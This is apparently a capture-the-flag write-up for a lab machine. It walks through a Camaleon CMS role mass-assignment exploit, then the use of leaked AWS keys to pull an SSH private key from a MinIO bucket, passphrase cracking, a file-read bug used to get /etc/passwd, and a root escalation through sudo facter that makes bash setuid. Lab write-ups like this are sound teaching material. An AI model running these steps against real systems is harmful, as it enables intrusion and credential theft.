---
title: "From Camaleon to S3 Buckets to taking over the system."
date: 2026-02-01 00:00:00 +0800
categories: [CTF, exploitation, hacking]
tags: [CTF, exploitation, hacking]
--- 

### Introduction
Hello everyone.
In this post , we are going to: <br>
1. Exploit a Camaleon CMS vulnerability (CVE-2025-2304) <br> 
2. Taking advantage of exposed AWS Credentials to access a sensitive S3 bucket that will give us spicy information<br> 
3. Getting access to the machine as user<br> 
4. Escalate our privileges with a program misconfiguration vulnerable to PE.<br> 

### Reconnaissance 

Our target IP is: 10.129.20.186<br> 
As always , i start my scan with [Rustscan](https://github.com/bee-san/RustScan) , a powerful and fast tool that can let us <br>
understand which port is open , faster than Nmap, that we're gonna use just right after getting all the open ports to analyze them better.<br>


#### Network recon
```bash
rustscan -a 10.129.20.186 --ulimit 5000 -g
Open 10.129.20.186:22  
Open 10.129.20.186:80  
Open 10.129.20.186:54321
```
```bash
nmap -sT -A -Pn -T5 -p 22,80,54321 10.129.20.186 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=2s

PORT      STATE SERVICE VERSION  
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)  
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)  


80/tcp    open  http    nginx 1.26.3 (Ubuntu)  
|_http-title: Did not follow redirect to http://facts.htb/  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: nginx/1.26.3 (Ubuntu)  
54321/tcp open  http    Golang net/http server  
|_http-title: Did not follow redirect to http://10.129.20.186:9001  
| http-methods:    
|_  Supported Methods: GET OPTIONS  
|_http-server-header: MinIO  
| fingerprint-strings:    
|   FourOhFourRequest:    
|     HTTP/1.0 400 Bad Request  
|     Accept-Ranges: bytes  
|     Content-Length: 303  
|     Content-Type: application/xml  
|     Server: MinIO  
|     Strict-Transport-Security: max-age=31536000; includeSubDomains  
|     Vary: Origin  
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8  
|     X-Amz-Request-Id: 188FEB7AB90B774F  
|     X-Content-Type-Options: nosniff  
|     X-Xss-Protection: 1; mode=block  
|     Date: Sat, 31 Jan 2026 20:41:30 GMT  
|     <?xml version="1.0" encoding="UTF-8"?>  
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt  
.bak</Resource><RequestId>188FEB7AB90B774F</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8<  
/HostId></Error>  
|   GenericLines, Help, RTSPRequest, SSLSessionReq:    
|     HTTP/1.1 400 Bad Request  
|     Content-Type: text/plain; charset=utf-8  
|     Connection: close  
|     Request  
|   GetRequest:    
|     HTTP/1.0 400 Bad Request  
|     Accept-Ranges: bytes  
|     Content-Length: 276  
|     Content-Type: application/xml  
|     Server: MinIO  
|     Strict-Transport-Security: max-age=31536000; includeSubDomains  
|     Vary: Origin  
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8  
|     X-Amz-Request-Id: 188FEB7702DDD6CB  
|     X-Content-Type-Options: nosniff  
|     X-Xss-Protection: 1; mode=block  
|     Date: Sat, 31 Jan 2026 20:41:14 GMT  
|     <?xml version="1.0" encoding="UTF-8"?>  
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1  
88FEB7702DDD6CB</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>  
|   HTTPOptions:    
|     HTTP/1.0 200 OK  
|     Vary: Origin  
|     Date: Sat, 31 Jan 2026 20:41:15 GMT  
|_    Content-Length: 0  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http  
s://nmap.org/cgi-bin/submit.cgi?new-service :
```

To summarize, we have: <br >
**SSH** : 9.9p1<br>
**HTTP website** : Nginx 1.26.3 <br>
**54321/tcp** :  Golang net/http server REDIRECT --> http://10.129.20.186:9001 (MINIO) <br>

Since we have a website, let's add in our hosts file as facts.htb  <br>
`echo 10.129.20.186 >> /etc/hosts`<br>
## Enumeration

#### Assets enumeration  
Before of taking a look at the Webserver, let's leave something in the background <br>
- FFUF : To discover any alive VHosts
- Feroxbuster : To map every available share in the website

```bash
❯ ffuf -u https://facts.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.facts.htb" -fc 404
OUTPUT: 0
```
```bash
❯ feroxbuster -u http://facts.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -C 404
``` 
```bash
OUTPUT: 
http://facts.htb/admin.cgi
http://facts.htb/ajax
http://facts.htb/captcha
http://facts.htb/assets/themes/camaleon_first/assets/js/main-2d9adb006939c9873a62dff797c5fc28dff961487a2bb550824c5bc6b8dbb881.js
http://facts.htb/robots.txt
http://facts.htb/sitemap.xml
http://facts.htb/up
```
   

## Website
<img width="1796" height="834" alt="image" src="https://github.com/user-attachments/assets/0fe8eedf-cb0e-45d0-be58-4d21ac9ab10d" /> <br>
So let's try to moving around what we have found fuzzing directories. <br>

Going to  `http://facts.htb/assets/themes/camaleon_first/assets/js/main-2d9adb006939c9873a62dff797c5fc28dff961487a2bb550824c5bc6b8dbb881.js` <br>
Reveals  that the website is using jQuery v2.2.4, which could be' vulnerable to [CVE-2020-11022](https://nvd.nist.gov/vuln/detail/cve-2020-11022)
```
/*!
 * jQuery JavaScript Library v2.2.4
 * http://jquery.com/
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license
 * http://jquery.org/license
 *
 * Date: 2016-05-20T17:23Z
 */
```
<br>
However we can also read "camaleon_first" in the url = Camaleon CMS is being used. <br>
Going to the other endpoints results in any interesting informations,expect for /admin <br>
<img width="353" height="522" alt="image" src="https://github.com/user-attachments/assets/17caafd1-e3ca-47fc-b80c-8d1087ec18a2" />
Digging in <br>
I tried to: <br>
1. Understand if the username enumeration was possible through response analysis <br>
2. Inject classic payloads (SQLi and more)


<img width="1512" height="668" alt="image" src="https://github.com/user-attachments/assets/8effe11f-073b-480a-8ec0-9dcb3b6cd004" />
Here we can see there is no XSS protection


I also discovered some pages with some users comments, so i tried to see if any of this user was available for login in the website:
<img width="622" height="254" alt="image" src="https://github.com/user-attachments/assets/b97b4ba9-7111-4f5c-b297-d44a300bb0d5" />

But no dice. <br>
I then tried to find something in forgot password (Injection or email enumeration)<br>
> In order to skip email validation remove this HTML tag <br>
<img width="722" height="40" alt="image" src="https://github.com/user-attachments/assets/8008fbca-afe1-4e40-8f13-e5d26ea274b4" />

However nothing of this worked and that made filter out those endpoints. <br>

So i registered a new account: <br>
<img width="334" height="832" alt="image" src="https://github.com/user-attachments/assets/26ed5f41-d269-483e-814f-fab65d720b31" />

With this i had access to my own admin panel (For post management) <br>
on the bottom i noticed: <br>
<img width="221" height="85" alt="image" src="https://github.com/user-attachments/assets/95e7b8a6-f4ff-4340-9418-46c54a01dd95" />
Looking up on google for Camaleon Version 2.9.0 i have found:

<img width="1450" height="757" alt="image" src="https://github.com/user-attachments/assets/83cc4ce9-ff18-4465-9ba6-ece357eabe5b" />

## Exploitation
Since any Proof of concept was around, i read the vulnerable pieces code <br>
```ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')

  # keep user logged in when changing their own password
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```
In Ruby on Rails, security rules usually act like a "guest list" for a club—only the names on the list get in.
However, using the method .permit! is like telling: "Let everyone in without checking their ID."

Even if a form is designed only to change a password, a hacker can "hide" extra data in the request. <br>
<img width="379" height="309" alt="image" src="https://github.com/user-attachments/assets/6d6215cc-3ea4-4ff3-92c2-ca39c61a8fee" />

What's interesting in it? Role.<br>

Exploitation steps:
1. Use a proxy (e.g Burpsuite,Caido) for intercepting the password change request <br>
2. Change the password <br>
<img width="755" height="604" alt="image" src="https://github.com/user-attachments/assets/f55d759a-a1b0-4bab-b011-4c89d3a6b31f" />
3. The request will look like so <br>
4. don't send this request to repeater, simply add &password[role]=admin and forward the request. <br>
5. As results, we now are: <br>
   <img width="371" height="80" alt="image" src="https://github.com/user-attachments/assets/d77eb7cf-cbaf-4a12-aece-f0aa39182ae7" />


Getting access as Admin, made me able to access the configuration page, that exposes AWS credentials. <br>
<img width="689" height="426" alt="image" src="https://github.com/user-attachments/assets/55670502-e756-4ad9-a493-65fbbea2b02e" />

#### S3 Bucket attack
Access key id: AKIAA35AE79B59943F92  <br>
Bucket name:   randomfacts <br>
Secret key:    m3z8jYtSV/j4WdnRoci3H2psWYztUI7yD5o/OvcS   <br>
Region:        us-east-1<br>

I used aws-cli in linux to get access to the bucket.

Simply  with  `aws configure --profile local`
<img width="661" height="97" alt="image" src="https://github.com/user-attachments/assets/61aea5ad-276f-4812-8f62-b0e72a89b219" />

```bash
❯ aws s3 ls --profile local --endpoint-url http://facts.htb:54321  
2025-09-11 14:06:52 internal  
2025-09-11 14:06:52 randomfacts
```

2 interesting buckets were found inside.
I enumerated internal and found that..
```
❯ aws s3 ls s3://internal --recursive --profile local --endpoint-url http://facts.htb:54321/

.ssh/id_ed25519
```

A private SSH key. <br>
So i downloaded it <br>
```bash
aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --profile local --endpoint-url http://facts.htb:54321/
```  
and tried to access the machine with common username as facts..admin..dev..internal.. but nothing worked. <br>
So i had to extract the public key (containing the username ) from this private key, but in order to do that, i needed the passphrase of the private key. <br>
To crack the password , i used [sshng2john](https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py) <br>

However a problem appeared, it's a very old tool and it requires python2.
Since it's very deprecated, i used a docker container with python in order to prevent installing it in my system

```bash
sudo docker run -it --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp python:2.7 python sshng2john.py id_ed25519
```

<img width="929" height="189" alt="image" src="https://github.com/user-attachments/assets/3123181f-9115-498c-88b7-7aad64f9dae0" />

Using i was able to get the password. However extracting the public key was not the solution.
`john --wordlist=/usr/share/wordlists/rockyou.txt hash `
#### CVE-2024-46987
Looking up on internet, i found out that Camaleon was also vulnerable to CVE-2024-46987 <br>
Using a poc i was able to download /etc/passwd and get two names: william and trivia, Trivia worked. <br>

I then used the private key to  get access to the server. <br>

## Privilege escalation
The user was able to run as sudo **/usr/bin/facter**:
<img width="920" height="156" alt="image" src="https://github.com/user-attachments/assets/4d83aede-9797-4c83-b948-e072e9b66a16" />

Looking up on gtfobins, i found

<img width="670" height="318" alt="image" src="https://github.com/user-attachments/assets/8f995f82-a591-4d01-8b9a-79949e128179" />

We can load arbitrary code , so let's exploit it. <br>
```bash
trivia@facts:/tmp/facter$ echo 'Facter.add(:innocentx0_fact) do setcode { system("chmod +s /bin/bash")} end' > root.rb
trivia@facts:/tmp/facter$ sudo /usr/bin/facter --custom-dir=/tmp/facter/ innocentx0_fact

true

bash-5.2# cat /root/root.txt  
2c494f4c063************
```
### Pwned
<img width="699" height="468" alt="image" src="https://github.com/user-attachments/assets/50758c80-f99c-48a0-9d73-13c6d2d10dd1" />


